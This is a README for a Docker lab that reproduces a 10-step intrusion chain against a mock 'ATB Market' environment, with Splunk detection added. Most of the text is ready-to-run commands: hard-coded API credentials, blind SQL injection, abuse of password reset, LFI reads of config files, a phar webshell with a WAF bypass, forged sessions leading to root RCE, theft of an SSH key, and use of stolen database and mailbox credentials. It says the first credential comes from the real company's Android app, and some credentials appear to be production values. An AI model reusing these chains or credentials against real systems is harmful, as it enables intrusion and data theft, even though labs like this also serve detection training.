# ATB Market — Attack-Chain Lab

A self-contained Docker lab that reproduces a 10-step red-team kill-chain
end-to-end, with Splunk ingesting telemetry from every stage.

**Lab only.** Every host, credential and vulnerability here is fictional and
deliberately insecure. Run it on an isolated machine and never expose the ports.

## Requirements

Linux / WSL2 / macOS with Docker Engine >= 24 and compose v2, ~8 GB free RAM
(Splunk wants ~2 GB), ~6 GB disk, and `make` / `bash` / `curl` / `python3` / `ssh`.

## Get it running

```bash
git clone https://github.com/some60dy/atb-lab.git
cd atb-lab
make up        # bootstrap keys -> build -> start 19 containers (first run pulls Splunk ~2.5 GB)
make ps        # wait until all are "running" (~60-90 s for DB seed + Splunk)
make chain     # run the whole attack chain
make down      # stop        make reset = stop + wipe volumes & logs
```

The first credential is not in this repo. The mobile API login that unlocks
step 1 is, in reality, extracted from the ATB Android APK (decompile
`assets/index.android.bundle` with [hermes-dec](https://github.com/P1sec/hermes-dec)).
The `mobapp` service just accepts it so the chain is reproducible without the APK.
Full walkthrough: [docs/apk-recon.md](docs/apk-recon.md).

## Service links

| Service | URL | Notes |
|---|---|---|
| Shop (Yii2) | http://localhost:8080 | SQLi target |
| mobapp API | http://localhost:8081 | hard-coded Basic creds |
| education (Moodle) | http://localhost:8082 | config leak |
| supplier (SuiteCRM) | http://localhost:8083 | LFI + phar webshell |
| zabbix | http://localhost:8084 | `api_jsonrpc.php` |
| harbor | http://localhost:8085 | registry, leaked creds |
| ad-ldap | http://localhost:8386 | directory mock |
| grafana | http://localhost:3000 | reused creds |
| exchange (EWS) | http://localhost:8444 | `/ews/Exchange.asmx` |
| Splunk | http://localhost:8000 | admin / changeme |

Non-HTTP: jenkins ZBXD `tcp/10050`, oracle `1581/1521/1251`, squid `3128`,
bastion ssh `2210`, gitlab ssh `2222`, mysql `3306/3307/3308`, postgres `5432`.

## Steps

Run every command from the repo root. URLs with `filter[...]` need `curl -g`.

**1. Recon** — hard-coded API creds + unauthenticated Moodle config leak
```bash
curl -s -u 'reg_user:basic*88password!prod99' -H 'Content-Type: application/json' -d '{"phoneNumber":"+380000000000"}' http://localhost:8081/register/login
curl -s -X POST http://localhost:8082/md/blocks/moco_news/ajax.php --data 'procedure=getPosts'
```

**2. SQL injection** — boolean-blind on the catalog filter key
```bash
python3 attack/sqli_oracle.py http://localhost:8080
```

**3. Supplier portal** — self-registration + password reset
```bash
curl -s 'http://localhost:8083/index.php?entryPoint=RegistrationStep3' --data 'user_name=b9atbsup01@guerrillamailblock.com'; G=$(curl -s 'http://localhost:8083/index.php?entryPoint=GeneratePassword' --data 'user_name=b9atbsup01@guerrillamailblock.com&link=1' | grep -oE '[0-9a-f-]{36}' | head -1); curl -s "http://localhost:8083/index.php?entryPoint=Changenewpassword&guid=$G" --data 'password1=AtbB9Sup2026x!&password2=AtbB9Sup2026x!'
```

**4. LFI** — read arbitrary files via Import mapping
```bash
curl -s 'http://localhost:8083/index.php?module=Import&action=RefreshMapping&to_pdf=true' --data 'importFile=/var/www/config_override.php' | sed 's/<[^>]*>/ /g'
```

**5. Web-shell** — phar polyglot, 180 KB WAF bypass
```bash
python3 attack/upload_phar.py http://localhost:8083
```

**6. Privilege escalation** — Grafana to forged Zabbix session to root RCE
```bash
python3 attack/forge_zabbix_session.py http://localhost:3000 http://localhost:8084 'id; hostname'
```

**7. Keys to everything** — ZBXD on Jenkins, pull backup key, SSH
```bash
python3 attack/zbxd_run.py 'cat /mnt/BACKUP/root.tar.gz | base64' localhost 10050 | tr -d '\n' | base64 -d > /tmp/atb_root.tar.gz; tar -xzf /tmp/atb_root.tar.gz -C /tmp; chmod 600 /tmp/root/.ssh/id_rsa_root; ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/root/.ssh/id_rsa_root -p 2210 root@localhost 'id; hostname'
```

**8. Databases** — Oracle probes, Harbor-leaked creds, AD bind, direct DB
```bash
python3 attack/oracle_probe.py localhost 1581 XX_SUP_PORTAL_RO S0h6jWot2fTLSMm
curl -s http://localhost:8085/image/ishop/api/env
mysql -h127.0.0.1 -P3306 -uishop -p'rEQaZ55o7x_E53oC' ishop -e 'SELECT COUNT(*) FROM users;'
```

**9. Mail** — Exchange EWS with stolen mailbox creds
```bash
curl -s -u 'supplier@atbmarket.com:supplier123569' -H 'Content-Type: text/xml' --data @attack/ews_finditem.xml http://localhost:8444/ews/Exchange.asmx | grep -oE 'TotalItemsInView="[0-9]+"'
```

**10. Source code** — root SSH to GitLab (524 repos)
```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/root/.ssh/id_rsa_root -p 2222 root@localhost 'find /var/opt/gitlab/git-data/repositories -name "*.git" | wc -l; hostname'
```

## Detection (Splunk)

http://localhost:8000 (admin / changeme), index `atb`:
```spl
index=atb | sort 0 _time | table _time host service event src_ip msg
```

## Docs

- [docs/attack-chain.md](docs/attack-chain.md) — every step in detail
- [docs/asset-inventory.md](docs/asset-inventory.md) — hosts, credentials, databases
- [docs/apk-recon.md](docs/apk-recon.md) — extracting step 1's credential from the real APK
- [docs/network.md](docs/network.md) — network notes
- [splunk/detections.md](splunk/detections.md) — SPL per stage
- [DEPLOY.md](DEPLOY.md) — deployment guide
